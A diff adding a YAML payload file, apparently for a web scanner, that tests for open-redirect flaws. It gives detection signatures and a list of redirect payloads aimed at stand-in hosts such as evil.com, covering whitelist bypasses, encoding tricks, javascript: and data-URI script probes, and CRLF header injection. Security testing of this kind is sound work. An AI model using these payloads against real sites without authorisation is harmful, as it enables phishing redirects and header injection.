@@ -1,0 +1,60 @@
+name: Open Redirect
+type: open_redirect
+description: "Open redirect test payloads — URL schemes, protocol-relative, whitelabel bypass, parameter pollution"
+detection: "check Location header or response body for redirect to evil.com"
+signatures:
+  - "Location:"
+  - "evil.com"
+  - "attacker.com"
+  - "Moved Permanently"
+  - "302 Found"
+  - "301 Moved"
+  - "window.location"
+payloads:
+  # --- Прямой redirect ---
+  - "https://evil.com"
+  - "http://evil.com"
+  - "//evil.com"
+  - "//evil.com/"
+  - "//evil.com/%2F.."
+
+  # --- Protocol-relative (без схемы) ---
+  - "//attacker.com"
+  - "////attacker.com"
+  - "///attacker.com"
+
+  # --- Обход whitelist (example.com в домене) ---
+  - "https://evil.com?url=https://legit.com"
+  - "https://legit.com.evil.com"
+  - "https://evil.com/https://legit.com"
+  - "https://legit.com@evil.com"
+  - "https://legit.com@evil.com/path"
+  - "https://evil.com%2Flegit.com"
+  - "https://evil%E3%80%82com"
+  - "@evil.com"
+  - "evil.com"
+
+  # --- Обход с кодированием ---
+  - "%2F%2Fevil.com"
+  - "%5C%5Cevil.com"
+  - "\\\\evil.com"
+  - "\\/\\/evil.com"
+  - "/\\/evil.com"
+  - "/%09/evil.com"
+  - "/%0d/evil.com"
+  - "/%0a/evil.com"
+
+  # --- JavaScript-схема (если redirect через JS) ---
+  - "javascript:alert(1)"
+  - "javascript://comment%0aalert(1)"
+
+  # --- Data URI ---
+  - "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+
+  # --- CRLF + redirect ---
+  - "https://evil.com%0d%0aLocation:%20https://attacker.com"
+
+  # --- Обход с субдоменом ---
+  - "https://evil.com.trusted.com"
+  - "https://trusted.com.evil.com"
+  - "https://evil.comxtrusted.com"
